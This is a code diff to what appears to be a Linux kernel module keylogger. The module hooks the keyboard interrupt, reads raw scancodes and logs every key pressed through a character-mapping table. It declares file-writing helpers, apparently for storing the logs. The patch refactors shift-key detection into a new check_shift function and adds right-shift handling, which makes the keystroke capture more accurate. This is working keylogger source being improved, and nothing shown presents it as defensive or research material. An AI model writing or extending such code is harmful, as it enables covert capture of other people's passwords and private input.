@@ -23,6 +23,7 @@ struct file *createFile(const char *path, int flags, int rights);
 int file_write(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size);
 static irqreturn_t get_scancode(int irq, void *dev_id);
 void scancode_to_key(char scancode);
+void check_shift(unsigned char scancode);
 
 //Matrix of all characters we will be tracking. Assuming a standard 101/102 US keyboard
 
@@ -82,17 +83,7 @@ static irqreturn_t get_scancode(int irq, void *dev_id)
 {
 	unsigned char scancode;
 	scancode = inb(KBD_INPUT_PORT);
-
-	if (scancode == LEFT_SHIFT)
-	{
-		shiftPressed = 1;
-	}
-
-	if (scancode == LEFT_SHIFT_RELEASE)
-	{
-		shiftPressed = 0;
-	}
-
+	check_shift(scancode);
 	scancode_to_key(scancode);
     return IRQ_HANDLED;
 }
@@ -102,6 +93,19 @@ void scancode_to_key(char scancode)
 	if (scancodes[scancode][0] != '\0')
 	{
 		printk("%s\n", scancodes[scancode][shiftPressed]);
+	}
+}
+
+void check_shift(unsigned char scancode)
+{
+	if (scancode == LEFT_SHIFT || scancode == RIGHT_SHIFT)
+	{
+		shiftPressed = 1;
+	}
+
+	if (scancode == LEFT_SHIFT_RELEASE || scancode == RIGHT_SHIFT_RELEASE)
+	{
+		shiftPressed = 0;
 	}
 }
   
